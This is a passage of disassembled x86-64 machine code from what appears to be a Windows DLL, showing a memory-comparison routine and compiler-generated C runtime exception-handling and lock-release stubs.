   18000f2e5:	75 2c                	jne    0x18000f313
   18000f2e7:	48 ff c1             	inc    %rcx
   18000f2ea:	49 ff c8             	dec    %r8
   18000f2ed:	f6 c1 07             	test   $0x7,%cl
   18000f2f0:	75 ee                	jne    0x18000f2e0
   18000f2f2:	4d 8b c8             	mov    %r8,%r9
   18000f2f5:	49 c1 e9 03          	shr    $0x3,%r9
   18000f2f9:	75 1f                	jne    0x18000f31a
   18000f2fb:	4d 85 c0             	test   %r8,%r8
   18000f2fe:	74 0f                	je     0x18000f30f
   18000f300:	8a 01                	mov    (%rcx),%al
   18000f302:	3a 04 11             	cmp    (%rcx,%rdx,1),%al
   18000f305:	75 0c                	jne    0x18000f313
   18000f307:	48 ff c1             	inc    %rcx
   18000f30a:	49 ff c8             	dec    %r8
   18000f30d:	75 f1                	jne    0x18000f300
   18000f30f:	48 33 c0             	xor    %rax,%rax
   18000f312:	c3                   	ret
   18000f313:	1b c0                	sbb    %eax,%eax
   18000f315:	83 d8 ff             	sbb    $0xffffffff,%eax
   18000f318:	c3                   	ret
   18000f319:	90                   	nop
   18000f31a:	49 c1 e9 02          	shr    $0x2,%r9
   18000f31e:	74 37                	je     0x18000f357
   18000f320:	48 8b 01             	mov    (%rcx),%rax
   18000f323:	48 3b 04 11          	cmp    (%rcx,%rdx,1),%rax
   18000f327:	75 5b                	jne    0x18000f384
   18000f329:	48 8b 41 08          	mov    0x8(%rcx),%rax
   18000f32d:	48 3b 44 11 08       	cmp    0x8(%rcx,%rdx,1),%rax
   18000f332:	75 4c                	jne    0x18000f380
   18000f334:	48 8b 41 10          	mov    0x10(%rcx),%rax
   18000f338:	48 3b 44 11 10       	cmp    0x10(%rcx,%rdx,1),%rax
   18000f33d:	75 3d                	jne    0x18000f37c
   18000f33f:	48 8b 41 18          	mov    0x18(%rcx),%rax
   18000f343:	48 3b 44 11 18       	cmp    0x18(%rcx,%rdx,1),%rax
   18000f348:	75 2e                	jne    0x18000f378
   18000f34a:	48 83 c1 20          	add    $0x20,%rcx
   18000f34e:	49 ff c9             	dec    %r9
   18000f351:	75 cd                	jne    0x18000f320
   18000f353:	49 83 e0 1f          	and    $0x1f,%r8
   18000f357:	4d 8b c8             	mov    %r8,%r9
   18000f35a:	49 c1 e9 03          	shr    $0x3,%r9
   18000f35e:	74 9b                	je     0x18000f2fb
   18000f360:	48 8b 01             	mov    (%rcx),%rax
   18000f363:	48 3b 04 11          	cmp    (%rcx,%rdx,1),%rax
   18000f367:	75 1b                	jne    0x18000f384
   18000f369:	48 83 c1 08          	add    $0x8,%rcx
   18000f36d:	49 ff c9             	dec    %r9
   18000f370:	75 ee                	jne    0x18000f360
   18000f372:	49 83 e0 07          	and    $0x7,%r8
   18000f376:	eb 83                	jmp    0x18000f2fb
   18000f378:	48 83 c1 08          	add    $0x8,%rcx
   18000f37c:	48 83 c1 08          	add    $0x8,%rcx
   18000f380:	48 83 c1 08          	add    $0x8,%rcx
   18000f384:	48 8b 0c 0a          	mov    (%rdx,%rcx,1),%rcx
   18000f388:	48 0f c8             	bswap  %rax
   18000f38b:	48 0f c9             	bswap  %rcx
   18000f38e:	48 3b c1             	cmp    %rcx,%rax
   18000f391:	1b c0                	sbb    %eax,%eax
   18000f393:	83 d8 ff             	sbb    $0xffffffff,%eax
   18000f396:	c3                   	ret
   18000f397:	cc                   	int3
   18000f398:	cc                   	int3
   18000f399:	cc                   	int3
   18000f39a:	cc                   	int3
   18000f39b:	cc                   	int3
   18000f39c:	cc                   	int3
   18000f39d:	cc                   	int3
   18000f39e:	cc                   	int3
   18000f39f:	cc                   	int3
   18000f3a0:	cc                   	int3
   18000f3a1:	cc                   	int3
   18000f3a2:	cc                   	int3
   18000f3a3:	cc                   	int3
   18000f3a4:	cc                   	int3
   18000f3a5:	cc                   	int3
   18000f3a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000f3ad:	00 00 00 
   18000f3b0:	ff e0                	jmp    *%rax
   18000f3b2:	cc                   	int3
   18000f3b3:	cc                   	int3
   18000f3b4:	cc                   	int3
   18000f3b5:	cc                   	int3
   18000f3b6:	cc                   	int3
   18000f3b7:	cc                   	int3
   18000f3b8:	cc                   	int3
   18000f3b9:	cc                   	int3
   18000f3ba:	cc                   	int3
   18000f3bb:	cc                   	int3
   18000f3bc:	cc                   	int3
   18000f3bd:	cc                   	int3
   18000f3be:	cc                   	int3
   18000f3bf:	cc                   	int3
   18000f3c0:	cc                   	int3
   18000f3c1:	cc                   	int3
   18000f3c2:	cc                   	int3
   18000f3c3:	cc                   	int3
   18000f3c4:	cc                   	int3
   18000f3c5:	cc                   	int3
   18000f3c6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000f3cd:	00 00 00 
   18000f3d0:	ff 25 92 0e 00 00    	jmp    *0xe92(%rip)        # 0x180010268
   18000f3d6:	cc                   	int3
   18000f3d7:	cc                   	int3
   18000f3d8:	cc                   	int3
   18000f3d9:	cc                   	int3
   18000f3da:	cc                   	int3
   18000f3db:	cc                   	int3
   18000f3dc:	cc                   	int3
   18000f3dd:	cc                   	int3
   18000f3de:	cc                   	int3
   18000f3df:	cc                   	int3
   18000f3e0:	48 8d 8a 20 00 00 00 	lea    0x20(%rdx),%rcx
   18000f3e7:	e9 a4 21 ff ff       	jmp    0x180001590
   18000f3ec:	40 55                	rex push %rbp
   18000f3ee:	48 8b ea             	mov    %rdx,%rbp
   18000f3f1:	48 8b 01             	mov    (%rcx),%rax
   18000f3f4:	33 c9                	xor    %ecx,%ecx
   18000f3f6:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   18000f3fc:	0f 94 c1             	sete   %cl
   18000f3ff:	8b c1                	mov    %ecx,%eax
   18000f401:	5d                   	pop    %rbp
   18000f402:	c3                   	ret
   18000f403:	cc                   	int3
   18000f404:	40 55                	rex push %rbp
   18000f406:	48 83 ec 20          	sub    $0x20,%rsp
   18000f40a:	48 8b ea             	mov    %rdx,%rbp
   18000f40d:	8a 4d 40             	mov    0x40(%rbp),%cl
   18000f410:	48 83 c4 20          	add    $0x20,%rsp
   18000f414:	5d                   	pop    %rbp
   18000f415:	e9 a2 29 ff ff       	jmp    0x180001dbc
   18000f41a:	cc                   	int3
   18000f41b:	40 55                	rex push %rbp
   18000f41d:	48 83 ec 20          	sub    $0x20,%rsp
   18000f421:	48 8b ea             	mov    %rdx,%rbp
   18000f424:	8a 4d 20             	mov    0x20(%rbp),%cl
   18000f427:	e8 90 29 ff ff       	call   0x180001dbc
   18000f42c:	90                   	nop
   18000f42d:	48 83 c4 20          	add    $0x20,%rsp
   18000f431:	5d                   	pop    %rbp
   18000f432:	c3                   	ret
   18000f433:	cc                   	int3
   18000f434:	40 55                	rex push %rbp
   18000f436:	48 83 ec 20          	sub    $0x20,%rsp
   18000f43a:	48 8b ea             	mov    %rdx,%rbp
   18000f43d:	48 83 c4 20          	add    $0x20,%rsp
   18000f441:	5d                   	pop    %rbp
   18000f442:	e9 f1 27 ff ff       	jmp    0x180001c38
   18000f447:	cc                   	int3
   18000f448:	40 55                	rex push %rbp
   18000f44a:	48 83 ec 30          	sub    $0x30,%rsp
   18000f44e:	48 8b ea             	mov    %rdx,%rbp
   18000f451:	48 8b 01             	mov    (%rcx),%rax
   18000f454:	8b 10                	mov    (%rax),%edx
   18000f456:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   18000f45b:	89 54 24 20          	mov    %edx,0x20(%rsp)
   18000f45f:	4c 8d 0d 6a 2a ff ff 	lea    -0xd596(%rip),%r9        # 0x180001ed0
   18000f466:	4c 8b 45 70          	mov    0x70(%rbp),%r8
   18000f46a:	8b 55 68             	mov    0x68(%rbp),%edx
   18000f46d:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   18000f471:	e8 32 27 ff ff       	call   0x180001ba8
   18000f476:	90                   	nop
   18000f477:	48 83 c4 30          	add    $0x30,%rsp
   18000f47b:	5d                   	pop    %rbp
   18000f47c:	c3                   	ret
   18000f47d:	cc                   	int3
   18000f47e:	40 53                	rex push %rbx
   18000f480:	55                   	push   %rbp
   18000f481:	48 83 ec 48          	sub    $0x48,%rsp
   18000f485:	48 8b ea             	mov    %rdx,%rbp
   18000f488:	48 89 4d 50          	mov    %rcx,0x50(%rbp)
   18000f48c:	48 89 4d 48          	mov    %rcx,0x48(%rbp)
   18000f490:	e8 3f 44 ff ff       	call   0x1800038d4
   18000f495:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   18000f49c:	48 89 48 70          	mov    %rcx,0x70(%rax)
   18000f4a0:	48 8b 45 48          	mov    0x48(%rbp),%rax
   18000f4a4:	48 8b 08             	mov    (%rax),%rcx
   18000f4a7:	48 8b 59 38          	mov    0x38(%rcx),%rbx
   18000f4ab:	e8 24 44 ff ff       	call   0x1800038d4
   18000f4b0:	48 89 58 68          	mov    %rbx,0x68(%rax)
   18000f4b4:	e8 1b 44 ff ff       	call   0x1800038d4
   18000f4b9:	8b 8d b8 00 00 00    	mov    0xb8(%rbp),%ecx
   18000f4bf:	89 48 78             	mov    %ecx,0x78(%rax)
   18000f4c2:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   18000f4c6:	c6 44 24 38 01       	movb   $0x1,0x38(%rsp)
   18000f4cb:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   18000f4d1:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   18000f4d6:	48 8b 85 a0 00 00 00 	mov    0xa0(%rbp),%rax
   18000f4dd:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000f4e2:	4c 8b 8d 98 00 00 00 	mov    0x98(%rbp),%r9
   18000f4e9:	4c 8b 85 90 00 00 00 	mov    0x90(%rbp),%r8
   18000f4f0:	48 8b 95 88 00 00 00 	mov    0x88(%rbp),%rdx
   18000f4f7:	48 8b 09             	mov    (%rcx),%rcx
   18000f4fa:	e8 19 54 ff ff       	call   0x180004918
   18000f4ff:	e8 d0 43 ff ff       	call   0x1800038d4
   18000f504:	48 83 60 70 00       	andq   $0x0,0x70(%rax)
   18000f509:	c7 45 40 01 00 00 00 	movl   $0x1,0x40(%rbp)
   18000f510:	b8 01 00 00 00       	mov    $0x1,%eax
   18000f515:	48 83 c4 48          	add    $0x48,%rsp
   18000f519:	5d                   	pop    %rbp
   18000f51a:	5b                   	pop    %rbx
   18000f51b:	c3                   	ret
   18000f51c:	cc                   	int3
   18000f51d:	40 53                	rex push %rbx
   18000f51f:	55                   	push   %rbp
   18000f520:	48 83 ec 28          	sub    $0x28,%rsp
   18000f524:	48 8b ea             	mov    %rdx,%rbp
   18000f527:	48 89 4d 38          	mov    %rcx,0x38(%rbp)
   18000f52b:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   18000f52f:	80 7d 58 00          	cmpb   $0x0,0x58(%rbp)
   18000f533:	74 6c                	je     0x18000f5a1
   18000f535:	48 8b 45 30          	mov    0x30(%rbp),%rax
   18000f539:	48 8b 08             	mov    (%rax),%rcx
   18000f53c:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   18000f540:	48 8b 45 28          	mov    0x28(%rbp),%rax
   18000f544:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   18000f54a:	75 55                	jne    0x18000f5a1
   18000f54c:	48 8b 45 28          	mov    0x28(%rbp),%rax
   18000f550:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   18000f554:	75 4b                	jne    0x18000f5a1
   18000f556:	48 8b 45 28          	mov    0x28(%rbp),%rax
   18000f55a:	81 78 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rax)
   18000f561:	74 1a                	je     0x18000f57d
   18000f563:	48 8b 45 28          	mov    0x28(%rbp),%rax
   18000f567:	81 78 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rax)
   18000f56e:	74 0d                	je     0x18000f57d
   18000f570:	48 8b 45 28          	mov    0x28(%rbp),%rax
   18000f574:	81 78 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rax)
   18000f57b:	75 24                	jne    0x18000f5a1
   18000f57d:	e8 52 43 ff ff       	call   0x1800038d4
   18000f582:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   18000f586:	48 89 48 20          	mov    %rcx,0x20(%rax)
   18000f58a:	48 8b 45 30          	mov    0x30(%rbp),%rax
   18000f58e:	48 8b 58 08          	mov    0x8(%rax),%rbx
   18000f592:	e8 3d 43 ff ff       	call   0x1800038d4
   18000f597:	48 89 58 28          	mov    %rbx,0x28(%rax)
   18000f59b:	e8 00 82 ff ff       	call   0x1800077a0
   18000f5a0:	90                   	nop
   18000f5a1:	c7 45 20 00 00 00 00 	movl   $0x0,0x20(%rbp)
   18000f5a8:	8b 45 20             	mov    0x20(%rbp),%eax
   18000f5ab:	48 83 c4 28          	add    $0x28,%rsp
   18000f5af:	5d                   	pop    %rbp
   18000f5b0:	5b                   	pop    %rbx
   18000f5b1:	c3                   	ret
   18000f5b2:	cc                   	int3
   18000f5b3:	40 55                	rex push %rbp
   18000f5b5:	48 83 ec 20          	sub    $0x20,%rsp
   18000f5b9:	48 8b ea             	mov    %rdx,%rbp
   18000f5bc:	48 89 8d 80 00 00 00 	mov    %rcx,0x80(%rbp)
   18000f5c3:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   18000f5c7:	44 8b 85 e8 00 00 00 	mov    0xe8(%rbp),%r8d
   18000f5ce:	48 8b 95 f8 00 00 00 	mov    0xf8(%rbp),%rdx
   18000f5d5:	e8 e2 5b ff ff       	call   0x1800051bc
   18000f5da:	90                   	nop
   18000f5db:	48 83 c4 20          	add    $0x20,%rsp
   18000f5df:	5d                   	pop    %rbp
   18000f5e0:	c3                   	ret
   18000f5e1:	cc                   	int3
   18000f5e2:	40 53                	rex push %rbx
   18000f5e4:	55                   	push   %rbp
   18000f5e5:	48 83 ec 28          	sub    $0x28,%rsp
   18000f5e9:	48 8b ea             	mov    %rdx,%rbp
   18000f5ec:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   18000f5f0:	e8 d7 39 ff ff       	call   0x180002fcc
   18000f5f5:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   18000f5f9:	75 3a                	jne    0x18000f635
   18000f5fb:	48 8b 9d f8 00 00 00 	mov    0xf8(%rbp),%rbx
   18000f602:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   18000f608:	75 2b                	jne    0x18000f635
   18000f60a:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   18000f60e:	75 25                	jne    0x18000f635
   18000f610:	8b 43 20             	mov    0x20(%rbx),%eax
   18000f613:	2d 20 05 93 19       	sub    $0x19930520,%eax
   18000f618:	83 f8 02             	cmp    $0x2,%eax
   18000f61b:	77 18                	ja     0x18000f635
   18000f61d:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   18000f621:	e8 86 3b ff ff       	call   0x1800031ac
   18000f626:	85 c0                	test   %eax,%eax
   18000f628:	74 0b                	je     0x18000f635
   18000f62a:	b2 01                	mov    $0x1,%dl
   18000f62c:	48 8b cb             	mov    %rbx,%rcx
   18000f62f:	e8 04 3b ff ff       	call   0x180003138
   18000f634:	90                   	nop
   18000f635:	e8 9a 42 ff ff       	call   0x1800038d4
   18000f63a:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   18000f63e:	48 89 48 20          	mov    %rcx,0x20(%rax)
   18000f642:	e8 8d 42 ff ff       	call   0x1800038d4
   18000f647:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   18000f64b:	48 89 48 28          	mov    %rcx,0x28(%rax)
   18000f64f:	e8 80 42 ff ff       	call   0x1800038d4
   18000f654:	8b 8d e0 00 00 00    	mov    0xe0(%rbp),%ecx
   18000f65a:	89 48 78             	mov    %ecx,0x78(%rax)
   18000f65d:	48 83 c4 28          	add    $0x28,%rsp
   18000f661:	5d                   	pop    %rbp
   18000f662:	5b                   	pop    %rbx
   18000f663:	c3                   	ret
   18000f664:	cc                   	int3
   18000f665:	40 55                	rex push %rbp
   18000f667:	48 83 ec 30          	sub    $0x30,%rsp
   18000f66b:	48 8b ea             	mov    %rdx,%rbp
   18000f66e:	e8 8d 3b ff ff       	call   0x180003200
   18000f673:	90                   	nop
   18000f674:	48 83 c4 30          	add    $0x30,%rsp
   18000f678:	5d                   	pop    %rbp
   18000f679:	c3                   	ret
   18000f67a:	cc                   	int3
   18000f67b:	40 55                	rex push %rbp
   18000f67d:	48 83 ec 30          	sub    $0x30,%rsp
   18000f681:	48 8b ea             	mov    %rdx,%rbp
   18000f684:	e8 4b 42 ff ff       	call   0x1800038d4
   18000f689:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   18000f68d:	7e 08                	jle    0x18000f697
   18000f68f:	e8 40 42 ff ff       	call   0x1800038d4
   18000f694:	ff 48 30             	decl   0x30(%rax)
   18000f697:	48 83 c4 30          	add    $0x30,%rsp
   18000f69b:	5d                   	pop    %rbp
   18000f69c:	c3                   	ret
   18000f69d:	cc                   	int3
   18000f69e:	40 55                	rex push %rbp
   18000f6a0:	48 83 ec 20          	sub    $0x20,%rsp
   18000f6a4:	48 8b ea             	mov    %rdx,%rbp
   18000f6a7:	48 8b 45 48          	mov    0x48(%rbp),%rax
   18000f6ab:	8b 08                	mov    (%rax),%ecx
   18000f6ad:	48 83 c4 20          	add    $0x20,%rsp
   18000f6b1:	5d                   	pop    %rbp
   18000f6b2:	e9 35 8a ff ff       	jmp    0x1800080ec
   18000f6b7:	cc                   	int3
   18000f6b8:	40 55                	rex push %rbp
   18000f6ba:	48 83 ec 20          	sub    $0x20,%rsp
   18000f6be:	48 8b ea             	mov    %rdx,%rbp
   18000f6c1:	48 8b 01             	mov    (%rcx),%rax
   18000f6c4:	8b 08                	mov    (%rax),%ecx
   18000f6c6:	e8 9d 72 ff ff       	call   0x180006968
   18000f6cb:	90                   	nop
   18000f6cc:	48 83 c4 20          	add    $0x20,%rsp
   18000f6d0:	5d                   	pop    %rbp
   18000f6d1:	c3                   	ret
   18000f6d2:	cc                   	int3
   18000f6d3:	40 55                	rex push %rbp
   18000f6d5:	48 83 ec 20          	sub    $0x20,%rsp
   18000f6d9:	48 8b ea             	mov    %rdx,%rbp
   18000f6dc:	33 c9                	xor    %ecx,%ecx
   18000f6de:	48 83 c4 20          	add    $0x20,%rsp
   18000f6e2:	5d                   	pop    %rbp
   18000f6e3:	e9 04 8a ff ff       	jmp    0x1800080ec
   18000f6e8:	cc                   	int3
   18000f6e9:	40 55                	rex push %rbp
   18000f6eb:	48 83 ec 20          	sub    $0x20,%rsp
   18000f6ef:	48 8b ea             	mov    %rdx,%rbp
   18000f6f2:	b9 05 00 00 00       	mov    $0x5,%ecx
   18000f6f7:	48 83 c4 20          	add    $0x20,%rsp
   18000f6fb:	5d                   	pop    %rbp
   18000f6fc:	e9 eb 89 ff ff       	jmp    0x1800080ec
   18000f701:	cc                   	int3
   18000f702:	40 55                	rex push %rbp
   18000f704:	48 83 ec 20          	sub    $0x20,%rsp
   18000f708:	48 8b ea             	mov    %rdx,%rbp
   18000f70b:	b9 07 00 00 00       	mov    $0x7,%ecx
   18000f710:	48 83 c4 20          	add    $0x20,%rsp
   18000f714:	5d                   	pop    %rbp
   18000f715:	e9 d2 89 ff ff       	jmp    0x1800080ec
   18000f71a:	cc                   	int3
   18000f71b:	40 55                	rex push %rbp
   18000f71d:	48 83 ec 20          	sub    $0x20,%rsp
   18000f721:	48 8b ea             	mov    %rdx,%rbp
   18000f724:	80 7d 70 00          	cmpb   $0x0,0x70(%rbp)
   18000f728:	74 0b                	je     0x18000f735
   18000f72a:	b9 03 00 00 00       	mov    $0x3,%ecx
   18000f72f:	e8 b8 89 ff ff       	call   0x1800080ec
   18000f734:	90                   	nop
   18000f735:	48 83 c4 20          	add    $0x20,%rsp
   18000f739:	5d                   	pop    %rbp
   18000f73a:	c3                   	ret
   18000f73b:	cc                   	int3
   18000f73c:	40 55                	rex push %rbp
   18000f73e:	48 83 ec 20          	sub    $0x20,%rsp
   18000f742:	48 8b ea             	mov    %rdx,%rbp
   18000f745:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   18000f749:	48 8b 09             	mov    (%rcx),%rcx
   18000f74c:	48 83 c4 20          	add    $0x20,%rsp
   18000f750:	5d                   	pop    %rbp
   18000f751:	e9 b6 b5 ff ff       	jmp    0x18000ad0c
   18000f756:	cc                   	int3
   18000f757:	40 55                	rex push %rbp
   18000f759:	48 83 ec 20          	sub    $0x20,%rsp
   18000f75d:	48 8b ea             	mov    %rdx,%rbp
   18000f760:	48 8b 85 98 00 00 00 	mov    0x98(%rbp),%rax
   18000f767:	8b 08                	mov    (%rax),%ecx
   18000f769:	48 83 c4 20          	add    $0x20,%rsp
   18000f76d:	5d                   	pop    %rbp
   18000f76e:	e9 79 89 ff ff       	jmp    0x1800080ec
   18000f773:	cc                   	int3
   18000f774:	40 55                	rex push %rbp
   18000f776:	48 83 ec 20          	sub    $0x20,%rsp
   18000f77a:	48 8b ea             	mov    %rdx,%rbp
   18000f77d:	48 8b 45 58          	mov    0x58(%rbp),%rax
   18000f781:	8b 08                	mov    (%rax),%ecx
   18000f783:	48 83 c4 20          	add    $0x20,%rsp
   18000f787:	5d                   	pop    %rbp
   18000f788:	e9 5f 89 ff ff       	jmp    0x1800080ec
   18000f78d:	cc                   	int3
   18000f78e:	40 55                	rex push %rbp
   18000f790:	48 83 ec 20          	sub    $0x20,%rsp
   18000f794:	48 8b ea             	mov    %rdx,%rbp
   18000f797:	b9 04 00 00 00       	mov    $0x4,%ecx
   18000f79c:	48 83 c4 20          	add    $0x20,%rsp
   18000f7a0:	5d                   	pop    %rbp
   18000f7a1:	e9 46 89 ff ff       	jmp    0x1800080ec
   18000f7a6:	cc                   	int3
   18000f7a7:	40 55                	rex push %rbp
   18000f7a9:	48 83 ec 20          	sub    $0x20,%rsp
   18000f7ad:	48 8b ea             	mov    %rdx,%rbp
   18000f7b0:	48 8b 45 48          	mov    0x48(%rbp),%rax
   18000f7b4:	8b 08                	mov    (%rax),%ecx
   18000f7b6:	48 83 c4 20          	add    $0x20,%rsp
   18000f7ba:	5d                   	pop    %rbp
   18000f7bb:	e9 cc ce ff ff       	jmp    0x18000c68c
   18000f7c0:	cc                   	int3
   18000f7c1:	40 55                	rex push %rbp
   18000f7c3:	48 83 ec 20          	sub    $0x20,%rsp
   18000f7c7:	48 8b ea             	mov    %rdx,%rbp
   18000f7ca:	8b 4d 50             	mov    0x50(%rbp),%ecx
   18000f7cd:	48 83 c4 20          	add    $0x20,%rsp
   18000f7d1:	5d                   	pop    %rbp
   18000f7d2:	e9 b5 ce ff ff       	jmp    0x18000c68c
   18000f7d7:	cc                   	int3
   18000f7d8:	40 55                	rex push %rbp
   18000f7da:	48 83 ec 20          	sub    $0x20,%rsp
   18000f7de:	48 8b ea             	mov    %rdx,%rbp
   18000f7e1:	b9 08 00 00 00       	mov    $0x8,%ecx
   18000f7e6:	48 83 c4 20          	add    $0x20,%rsp
   18000f7ea:	5d                   	pop    %rbp
   18000f7eb:	e9 fc 88 ff ff       	jmp    0x1800080ec
   18000f7f0:	cc                   	int3
   18000f7f1:	40 55                	rex push %rbp
   18000f7f3:	48 83 ec 20          	sub    $0x20,%rsp
   18000f7f7:	48 8b ea             	mov    %rdx,%rbp
   18000f7fa:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   18000f7fe:	48 83 c4 20          	add    $0x20,%rsp
   18000f802:	5d                   	pop    %rbp
   18000f803:	e9 04 b5 ff ff       	jmp    0x18000ad0c
   18000f808:	cc                   	int3
   18000f809:	40 55                	rex push %rbp
   18000f80b:	48 83 ec 20          	sub    $0x20,%rsp
   18000f80f:	48 8b ea             	mov    %rdx,%rbp
   18000f812:	48 8b 01             	mov    (%rcx),%rax
   18000f815:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   18000f81b:	74 0c                	je     0x18000f829
   18000f81d:	81 38 1d 00 00 c0    	cmpl   $0xc000001d,(%rax)
   18000f823:	74 04                	je     0x18000f829
   18000f825:	33 c0                	xor    %eax,%eax
   18000f827:	eb 05                	jmp    0x18000f82e
   18000f829:	b8 01 00 00 00       	mov    $0x1,%eax
   18000f82e:	48 83 c4 20          	add    $0x20,%rsp
   18000f832:	5d                   	pop    %rbp
   18000f833:	c3                   	ret
   18000f834:	cc                   	int3
   18000f835:	cc                   	int3
   18000f836:	cc                   	int3
   18000f837:	cc                   	int3
   18000f838:	cc                   	int3
   18000f839:	cc                   	int3
   18000f83a:	cc                   	int3
   18000f83b:	cc                   	int3
   18000f83c:	cc                   	int3
   18000f83d:	cc                   	int3
   18000f83e:	cc                   	int3
   18000f83f:	cc                   	int3
   18000f840:	40 55                	rex push %rbp
   18000f842:	48 83 ec 20          	sub    $0x20,%rsp
   18000f846:	48 8b ea             	mov    %rdx,%rbp
   18000f849:	48 8b 01             	mov    (%rcx),%rax
   18000f84c:	33 c9                	xor    %ecx,%ecx
   18000f84e:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   18000f854:	0f 94 c1             	sete   %cl
   18000f857:	8b c1                	mov    %ecx,%eax
   18000f859:	48 83 c4 20          	add    $0x20,%rsp
   18000f85d:	5d                   	pop    %rbp
   18000f85e:	c3                   	ret
   18000f85f:	cc                   	int3
   18000f860:	48 83 ec 28          	sub    $0x28,%rsp
   18000f864:	4c 8b 05 55 c4 00 00 	mov    0xc455(%rip),%r8        # 0x18001bcc0
   18000f86b:	48 8d 15 4e c4 00 00 	lea    0xc44e(%rip),%rdx        # 0x18001bcc0
   18000f872:	48 8d 0d 47 c4 00 00 	lea    0xc447(%rip),%rcx        # 0x18001bcc0
   18000f879:	4d 8b 40 08          	mov    0x8(%r8),%r8
   18000f87d:	e8 2e 1d ff ff       	call   0x1800015b0
   18000f882:	48 8b 0d 37 c4 00 00 	mov    0xc437(%rip),%rcx        # 0x18001bcc0
   18000f889:	ba 48 00 00 00       	mov    $0x48,%edx
   18000f88e:	48 83 c4 28          	add    $0x28,%rsp
   18000f892:	e9 c9 25 ff ff       	jmp    0x180001e60
